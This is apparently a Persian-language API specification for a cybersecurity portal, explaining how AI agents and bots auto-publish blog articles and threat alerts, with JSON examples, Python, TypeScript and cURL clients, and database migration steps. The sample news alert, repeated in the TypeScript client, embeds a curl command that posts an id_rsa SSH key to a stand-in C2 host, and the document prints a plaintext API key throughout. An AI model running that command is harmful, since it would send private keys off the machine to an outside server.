# راهنمای جامع اتصال هوش مصنوعی و انتشار محتوا در پرتال امنیت سایبری رهام
## Roham AI Content Ingestion & Auto-Posting REST API Specification (v2.0)

این مستند مشخصات فنی و استانداردهای جدید انتشار خودکار محتوا (مقالات تخصصی وبلاگ و هشدارهای رادار تهدیدات امنیتی) را برای **ایجنت‌های هوش مصنوعی (ChatGPT, Claude, Gemini, DeepSeek)**، بات‌های تلگرام/گیت‌هاب، اسکریپت‌های پایتون و سیستم‌های خودکار Ingestion تشریح می‌کند.

---

### ۱. معماری و خلاصه تغییرات نسخه ۲.۰

در معماری بازطراحی‌شده نسخه ۲.۰:
1. **ساختار یکپارچه و استاندارد (Unified Action):** تمام درخواست‌های وبلاگ و اخبار از طریق اکشن واحد `upsert_content` با تفکیک فیلد `type: "blog" | "news"` ارسال می‌شوند.
2. **حذف ساختار تودرتوی قدیمی:** ساختار پیچیده قبلی (`intro`, `sections`, `conclusion`, `paragraphs`, `codeSnippet`, `callout`) به طور کامل حذف شده است. مدل هوش مصنوعی یا کلاینت **فقط متادیتا + `bodyMarkdown`** تولید می‌کند.
3. **پردازش و رندر سمت سرور:** سرور PHP به صورت خودکار مارک‌داون را به HTML ساخت‌یافته تبدیل کرده، با فیلترهای ضد XSS ایمن‌سازی (Sanitize) می‌کند، و نسخه‌های سازگار با گذشته را در دیتابیس می‌سازد.
4. **مدیریت فیلدهای کنترلی توسط سرور:** فیلدهای امنیتی مانند `id`، شمارنده بازدید `views`، تاریخ سرور و حل نام رسمی دسته‌بندی از `categoryId` توسط سرور مدیریت می‌شوند و کلاینت اجازه جعل آن‌ها را ندارد.
5. **تاریخ‌های استاندارد ISO 8601:** فیلد `publishedAt` به فرمت جهانی ISO 8601 (مانند `2026-04-01T12:30:00Z`) است.
6. **قابلیت‌های سازمانی:** پشتیبانی کامل از **Idempotency** (هدر `Idempotency-Key`)، **Audit Log** (ثبت تغییرات)، **Rate Limiting** (کنترل نرخ ارسال) و **OpenAPI 3.1 / JSON Schema**.
7. **سازگاری موقت:** اکشن‌های قدیمی `save_blog` و `save_news` به طور کامل به سرویس جدید نگاشت می‌شوند.

---

### ۲. اطلاعات اندپوینت و روش‌های احراز هویت

- **مسیر اصلی اندپوینت:** `https://your-domain.com/api/content.php`
- **متد HTTP:** `POST` (یا `GET` برای لیست و اسکیما)
- **هدرهای الزامی:**
  ```http
  Content-Type: application/json; charset=utf-8
  X-API-KEY: roham_ai_publisher_secret_key_2026_xyz
  ```
- **هدر اختیاری عدم دوباره‌کاری (Idempotency):**
  ```http
  Idempotency-Key: 7b9f2c3d-8e4a-4e1b-9f2d-5c6a7b8c9d0e
  ```
  *(اگر به دلیل خطای شبکه درخواست مجدداً ارسال شود، سرور بدون اجرای دوباره کوئری، پاسخ کش‌شده را با هدر `X-Idempotency: HIT` بازمی‌گرداند).*

---

### ۳. جدول دسته‌بندی‌های رسمی سایت (`categoryId`)

هوش مصنوعی باید یکی از شناسه‌های استاندارد زیر را در فیلد `categoryId` قرار دهد (سرور به صورت خودکار عنوان رسمی فارسی را به محتوا متصل می‌کند):

| شناسه (`categoryId`) | عنوان رسمی دسته‌بندی | کاربرد |
|---|---|---|
| `malware-infostealers` | بدافزارها و استیلرها | وبلاگ و اخبار |
| `supply-chain` | حملات زنجیره تامین (Supply Chain) | وبلاگ و اخبار |
| `vulnerabilities-exploits` | تحلیل آسیب‌پذیری و اکسپلویت | وبلاگ و اخبار |
| `writeups-research` | گزارش‌های فنی و رایت‌آپ | وبلاگ و اخبار |
| `social-engineering` | مهندسی اجتماعی و فیشینگ | وبلاگ و اخبار |
| `cloud-infrastructure` | امنیت ابری و زیرساخت | وبلاگ و اخبار |
| `security-alerts` | اخبار و هشدارهای فوری | هشدارهای رادار |

---

### ۴. ساختار درخواست انتشار وبلاگ تخصصی (`type: "blog"`)

```json
{
  "action": "upsert_content",
  "type": "blog",
  "content": {
    "slug": "stealer-app-bound-encryption-bypass-analysis",
    "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption",
    "subtitle": "چگونه توسعه‌دهندگان بدافزار مکانیزم جدید کروم را دور می‌زنند؟",
    "summary": "واکاوی فنی تزریق به پردازه‌های مورد اعتماد کروم برای استخراج کوکی‌ها.",
    "categoryId": "malware-infostealers",
    "tags": ["AppBoundEncryption", "Chromium", "Infostealer"],
    "status": "published",
    "publishedAt": "2026-04-01T12:30:00Z",
    "author": {
      "name": "واحد تحلیل بدافزار رهام",
      "role": "Roham Threat Research Labs"
    },
    "difficulty": "deep-dive",
    "readTimeMinutes": 11,
    "isFeatured": true,
    "tldr": [
      "تکنیک‌های قدیمی DPAPI جایگزین شده‌اند.",
      "استیلرها با تزریق کد کلید را از حافظه می‌خوانند."
    ],
    "takeaways": [
      "محدودسازی دسترسی به User Data مرورگر",
      "کوتاه کردن عمر کوکی‌ها و استفاده از DPoP"
    ],
    "references": [
      {
        "title": "Chromium Security Architecture",
        "url": "https://www.chromium.org/Home/chromium-security/"
      }
    ],
    "bodyMarkdown": "## ۱. بررسی معماری حفاظتی کروم\n\nکروم کلید رمزگذاری را به سرویس سیستمی منتقل کرده است.\n\n```powershell\nGet-ItemProperty -Path 'HKLM:\\Software\\Google\\Chrome'\n```\n\n> هشدار امنیتی: فراخوانی غیرعادی APIهای ایجاد پردازه باید مانیتور شود."
  }
}
```

---

### ۵. ساختار درخواست انتشار خبر امنیت (`type: "news"`)

```json
{
  "action": "upsert_content",
  "type": "news",
  "content": {
    "slug": "critical-supply-chain-npm-backdoor-alert",
    "title": "هشدار فوری: کشف پکیج مسموم در NPM",
    "subtitle": "حمله زنجیره تامین گسترده علیه توسعه‌دهندگان",
    "summary": "بسته مخرب کلیدهای SSH و توکن‌های GitHub را به سرور C2 می‌فرستد.",
    "categoryId": "supply-chain",
    "tags": ["SupplyChain", "NPM", "SSH_Keys", "GitHub_Token"],
    "severity": "critical",
    "isBreaking": true,
    "status": "published",
    "publishedAt": "2026-04-01T12:30:00Z",
    "source": {
      "name": "BleepingComputer",
      "url": "https://www.bleepingcomputer.com/news/security/"
    },
    "tldr": [
      "پکیج مخرب بیش از ۵۰ هزار بار دانلود شده بود.",
      "اسکریپت postinstall کلیدهای پوشه ssh را سرقت می‌کرد."
    ],
    "iocs": [
      {
        "type": "Domain/C2",
        "value": "malicious-c2.net",
        "description": "سرور دریافت فایل‌های سرقت‌شده"
      }
    ],
    "bodyMarkdown": "## جزئیات بسته مخرب\n\nحمله از طریق اسکریپت postinstall آغاز می‌شود.\n\n```bash\ncurl -s -X POST https://malicious-c2.net/drop -d @id_rsa\n```"
  }
}
```

---

### ۶. نمونه کدهای اجرایی برای توسعه‌دهندگان و بات‌ها

#### ۱. نمونه پایتون (Python 3):
```python
import uuid
import requests

API_URL = "https://your-domain.com/api/content.php"
API_KEY = "roham_ai_publisher_secret_key_2026_xyz"

headers = {
    "Content-Type": "application/json; charset=utf-8",
    "X-API-KEY": API_KEY,
    "Idempotency-Key": str(uuid.uuid4()),  # جلوگیری از تکرار در صورت قطع شبکه
}

payload = {
    "action": "upsert_content",
    "type": "blog",
    "content": {
        "slug": "stealer-app-bound-encryption-bypass-analysis",
        "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption",
        "subtitle": "چگونه توسعه‌دهندگان بدافزار مکانیزم جدید کروم را دور می‌زنند؟",
        "summary": "واکاوی فنی تزریق به پردازه‌های مورد اعتماد کروم برای استخراج کوکی‌ها.",
        "categoryId": "malware-infostealers",
        "tags": ["AppBoundEncryption", "Chromium", "Infostealer"],
        "status": "published",
        "publishedAt": "2026-04-01T12:30:00Z",
        "author": {
            "name": "واحد تحلیل بدافزار رهام",
            "role": "Roham Threat Research Labs",
        },
        "difficulty": "deep-dive",
        "readTimeMinutes": 11,
        "isFeatured": True,
        "tldr": [
            "تکنیک‌های قدیمی DPAPI جایگزین شده‌اند.",
            "استیلرها با تزریق کد کلید را از حافظه می‌خوانند.",
        ],
        "takeaways": [
            "محدودسازی دسترسی به User Data مرورگر",
            "کوتاه کردن عمر کوکی‌ها و استفاده از DPoP",
        ],
        "references": [
            {
                "title": "Chromium Security Architecture",
                "url": "https://www.chromium.org/Home/chromium-security/",
            }
        ],
        "bodyMarkdown": """## ۱. بررسی معماری حفاظتی کروم

کروم کلید رمزگذاری را به سرویس سیستمی منتقل کرده است.

```powershell
Get-ItemProperty -Path 'HKLM:\\Software\\Google\\Chrome'
```

> هشدار امنیتی: فراخوانی غیرعادی APIهای ایجاد پردازه باید مانیتور شود.""",
    },
}

response = requests.post(API_URL, json=payload, headers=headers, timeout=30)
if response.status_code == 200:
    print("✅ با موفقیت منتشر شد:", response.json())
elif response.status_code == 429:
    print("⚠️ محدودیت نرخ ارسال! لطفاً صبر کنید:", response.headers.get("Retry-After"))
else:
    print(f"❌ خطا ({response.status_code}):", response.text)
```

---

#### ۲. نمونه Node.js (TypeScript / JavaScript):
```typescript
import crypto from "crypto";

const API_URL = "https://your-domain.com/api/content.php";
const API_KEY = "roham_ai_publisher_secret_key_2026_xyz";

async function publishNews() {
  const payload = {
    action: "upsert_content",
    type: "news",
    content: {
      slug: "critical-supply-chain-npm-backdoor-alert",
      title: "هشدار فوری: کشف پکیج مسموم در NPM",
      subtitle: "حمله زنجیره تامین گسترده علیه توسعه‌دهندگان",
      summary: "بسته مخرب کلیدهای SSH و توکن‌های GitHub را به سرور C2 می‌فرستد.",
      categoryId: "supply-chain",
      tags: ["SupplyChain", "NPM", "SSH_Keys", "GitHub_Token"],
      severity: "critical",
      isBreaking: true,
      status: "published",
      publishedAt: new Date().toISOString(),
      source: {
        name: "BleepingComputer",
        url: "https://www.bleepingcomputer.com/news/security/",
      },
      tldr: [
        "پکیج مخرب در کمتر از ۲۴ ساعت بیش از ۵۰ هزار بار دانلود شد.",
        "توکن‌های دسترسی به مخازن سازمانی به سرور C2 ارسال شده است.",
      ],
      bodyMarkdown: `## جزئیات بسته مخرب

حمله از طریق اسکریپت postinstall آغاز می‌شود.

\`\`\`bash
curl -s -X POST https://malicious-c2.net/drop -d @id_rsa
\`\`\``,
    },
  };

  const response = await fetch(API_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json; charset=utf-8",
      "X-API-KEY": API_KEY,
      "Idempotency-Key": crypto.randomUUID(),
    },
    body: JSON.stringify(payload),
  });

  const data = await response.json();
  if (response.ok) {
    console.log("✅ خبر منتشر شد:", data);
  } else {
    console.error("❌ خطا:", data);
  }
}

publishNews();
```

---

#### ۳. نمونه دستور cURL:
```bash
curl -X POST "https://your-domain.com/api/content.php" \
  -H "Content-Type: application/json; charset=utf-8" \
  -H "X-API-KEY: roham_ai_publisher_secret_key_2026_xyz" \
  -H "Idempotency-Key: test-idemp-key-2026-001" \
  -d '{
    "action": "upsert_content",
    "type": "blog",
    "content": {
      "slug": "curl-test-upsert",
      "title": "تست انتشار مستقیم با cURL و ساختار Markdown",
      "summary": "تست صحت کارکرد موتور جدید انتشار بدون فیلدهای ساختاری پیچیده.",
      "categoryId": "vulnerabilities-exploits",
      "tags": ["cURL", "Testing", "Markdown"],
      "status": "published",
      "bodyMarkdown": "## ۱. تیتر اول تست\n\nاین یک متن تستی است.\n\n```python\nprint(\"Hello Roham!\")\n```"
    }
  }'
```

---

### ۷. استانداردهای پاسخ سرور (Response Standards)

#### پاسخ موفق (200 OK):
```json
{
  "success": true,
  "ok": true,
  "message": "مقاله تخصصی وبلاگ با موفقیت ذخیره و منتشر شد.",
  "data": {
    "id": "blog-stealer-app-bound-encryption-bypass-analysis",
    "type": "blog",
    "slug": "stealer-app-bound-encryption-bypass-analysis",
    "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption",
    "status": "published",
    "publishedAt": "2026-04-01T12:30:00Z",
    "views": 0,
    "category": {
      "id": "malware-infostealers",
      "name": "بدافزارها و استیلرها",
      "slug": "malware-infostealers"
    },
    "url": "/blog/stealer-app-bound-encryption-bypass-analysis",
    "stats": {
      "bodyLength": 320,
      "readTimeMinutes": 11,
      "tagsCount": 3
    }
  },
  "meta": {
    "timestamp": "2026-04-01T12:30:01Z",
    "version": "2.0.0",
    "action": "upsert_content",
    "idempotencyKey": "test-key-123"
  }
}
```

#### پاسخ خطای اعتبارسنجی (400 Bad Request):
```json
{
  "success": false,
  "ok": false,
  "error": {
    "code": "VALIDATION_FAILED",
    "message": "اطلاعات ارسالی با ساختار استاندارد مطابقت ندارد.",
    "details": [
      {
        "field": "bodyMarkdown",
        "message": "متن مقاله به فرمت Markdown (فیلد bodyMarkdown) الزامی است."
      }
    ]
  },
  "meta": {
    "timestamp": "2026-04-01T12:30:01Z",
    "version": "2.0.0"
  }
}
```

#### پاسخ محدودیت نرخ ارسال (429 Too Many Requests):
```json
{
  "success": false,
  "ok": false,
  "error": {
    "code": "RATE_LIMIT_EXCEEDED",
    "message": "تعداد درخواست‌های ارسالی بیش از سقف مجاز است. لطفاً کمی صبر کرده و مجدداً تلاش کنید.",
    "details": {
      "retryAfterSeconds": 45
    }
  }
}
```

---

### ۸. اندپوینت‌های جانبی و کمکی

- **دریافت خودکار JSON Schema:**
  `GET /api/content.php?action=schema`
- **دریافت خودکار مشخصات OpenAPI 3.1:**
  `GET /api/content.php?action=openapi`
- **دریافت لاگ حسابرسی محتوا (فقط ادمین):**
  `GET /api/content.php?action=audit_logs&limit=50`
- **اجرای مهاجرت داده‌های قدیمی:**
  `POST /api/content.php?action=migrate`

---

### ۹. راهنمای بخش پست‌گذار پنل ادمین (Admin Content Manager v2.0)

بخش مدیریت محتوای پنل ادمین رهام (`components/roham/AdminContentManager.tsx`) در نسخه ۲.۰ به طور کامل بر پایه همین معماری بازطراحی شده است:

1. **حالت‌های نمایش سه‌گانه (View Modes):**
   - **نمای دوگانه (Split View):** ستون سمت راست برای ویرایش متادیتا و تایپ مارک‌داون؛ ستون سمت چپ پیش‌نمایش رندرشده زنده بلادرنگ.
   - **فقط ویرایشگر (Editor):** محیط تمام‌صفحه و متمرکز برای نگارش مقالات حجیم یا کپی پیست از فایل‌های خارجی.
   - **فقط پیش‌نمایش (Live Preview):** بررسی نهایی خروجی پیش از ارسال به سرور با کنترل کامل راست‌چین و چپ‌چین.

2. **تولبار دسترسی سریع به کدهای Markdown:**
   - درج خودکار تیترهای `## H2` و `### H3`
   - درج متن برجسته `**متن**`
   - درج کد تک‌خطی `` `code` `` و بلوک کدهای فنی ```powershell / bash / python```
   - درج جداول فنی مارک‌داون با هدر LTR
   - درج هشدارهای امنیتی استانداردهای رهام (`> هشدار امنیتی: ...`)
   - درج لیست‌های مرتب و نامرتب و پیوندهای مرجع

3. **سازگاری خودکار مقالات گذشته در پنل ادمین:**
   - هنگام کلیک بر روی دکمه «ویرایش» مقالات قدیمی با ساختار تودرتو، متد `reconstructBlogMarkdown` و `reconstructNewsMarkdown` به صورت پویا ساختار قدیمی را به متن زیبای Markdown یکپارچه تبدیل می‌کند تا ادمین بتواند بدون هیچ مشکلی آن را در فرمت جدید ویرایش و ذخیره کند.

4. **ارسال مستقیم به اندپوینت جدید:**
   - فرم ادمین از طریق تابع کلاینت `adminUpsertContent` داده‌ها را مستقیماً با متد `upsert_content` به سرور ارسال نموده و پاسخ غنی سرور را در حافظه محلی ذخیره می‌کند.

---

### ۱۰. راهنمای اجرای اسکریپت مهاجرت پایگاه داده (Database Migration Guide)

برای انتقال کامل ساختار دیتابیس فعلی به ساختار نرمال‌شده v2.0:

#### روش اول: اجرای مستقیم از طریق فایل SQL در phpMyAdmin یا خط فرمان MySQL
فایل `public/api/migration.sql` جداول جدید زیر را به صورت امن ایجاد کرده و شاخص‌های لازم را می‌سازد:
- جدول `contents`: نگهداری شناسنامه محتوا، متادیتا، `body_markdown` و `rendered_html`.
- جدول `categories`: دسته‌بندی‌های رسمی نرمال‌شده.
- جدول `tags`: کلیدواژه‌ها و تگ‌های امنیتی منحصر‌به‌فرد.
- جدول `content_tags`: جدول واسط رابطه چند‌به‌چند میان محتوا و تگ‌ها.
- جدول `content_audit_logs`: لاگ کامل تغییرات و انتشارات ایجنت‌ها و مدیران.
- جدول `content_idempotency`: جدول کش و مدیریت کلیدهای Idempotency برای جلوگیری از ثبت تکراری.

```bash
mysql -u roham_user -p corpel_roham < public/api/migration.sql
```

#### روش دوم: فراخوانی اسکریپت خودکار PHP (CLI یا Web)
اسکریپت `public/api/migrate.php` مقالات قدیمی جدول `roham_blog_posts` و اخبار `roham_news_articles` را خوانده، متن ساختاریافته آن‌ها را به Markdown تبدیل می‌کند و در جداول جدید ثبت می‌نماید:

```bash
# اجرا از طریق خط فرمان سرور cPanel / SSH:
php public/api/migrate.php
```

یا از طریق ارسال درخواست وب با کلید ادمین:
```bash
curl -X POST "https://your-domain.com/api/migrate.php" \
  -H "X-API-KEY: roham_ai_publisher_secret_key_2026_xyz"
```

